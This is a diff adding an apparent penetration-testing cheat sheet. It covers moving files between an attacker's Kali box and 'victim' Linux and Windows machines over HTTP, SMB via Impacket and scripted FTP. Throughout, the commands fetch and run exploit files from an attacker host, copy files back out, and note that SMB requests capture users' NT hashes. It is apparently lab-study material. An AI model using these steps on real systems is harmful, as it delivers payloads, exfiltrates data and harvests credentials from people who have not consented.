@@ -1,0 +1,109 @@
+LINUX :
+
+always used file transfer through http server:
+
+on kali : 1. goto the folder location where your file exist and want to transfer to victim machin
+           2. launch ternminal there and run , where 8081 is the listening port.
+                                      python -m SimpleHttpServer 8081
+                                              or for python3
+                                      python -m http.server 8081      
+
+           3. on victim box use wget or curl to fetch the file :
+                                      ex : wget http://10.10.10.10:8081/exploit.txt
+
+WINDOWS :
+
+
+//this is the only technique i used frequently for file transfer on windows , it worked for everybox! and moreover when a request hits our smbserver on kali, we can also get the NT hash of requesting user.
+through SMB!!
+
+note : get smbserver.py from impacket's git repository
+
+windows built in :D (so awesome)
+
+
+on kali :
+
+(smbserver.py, part of the Impacket project)
+
+on our kali machine, setup smbserver like this :
+
+
+python smbserver.py menoe /root/share
+
+
+then on windows client :
+
+net view \\attackerip
+
+dir \\attackerip\menoe
+
+copy \\attackerip\menoe\exploit.exe .
+
+copy C:\anyfile.exe \\attackerip\menoe\
+
+
+we can also directly run the exploits without copying.
+
+
+\\attackerip\\menoe\exploit.exe
+
+
+
+2 . using ftp ( used on old boxes. but still we can rely on our first technique always!)
+
+
+on kali :
+
+install :
+
+apt-get install python-pyftpdlib 
+
+then :
+
+python -m pyftpdlib -p 21
+
+(on folder that you want through a terminal)
+
+
+
+
+on client ( remote reverse windows shell )
+
+
+(if we have an interactive shell)
+c:/> ftp <attacker ip>
+>user anonymous
+>passsssss
+>binary
+>get exploit.exe
+
+(if we can only run one command at a time)
+
+C:/>ftp -s:ftp_commands.txt
+
+
+where ftp_commands.txt contains :
+
+open 10.10.10.10 
+anonymous  
+passsss  
+binary  
+get exploit.exe  
+bye  
+
+
+how do we get that? we can do this!!!
+
+C:\echo open 10.10.10.10>ftp_commands.txt  
+C:\>echo anonymous>>ftp_commands.txt  
+C:\>echo passsss>>ftp_commands.txt  
+C:\>echo binary>>ftp_commands.txt  
+C:\>echo get exploit.exe>>ftp_commands.txt  
+C:\>echo bye>>ftp_commands.txt  
+C:\>ftp -s:ftp_commands.txt  
+
+
+or a single command :
+
+C:\>echo open 10.10.10.10>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo get exploit.exe>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt
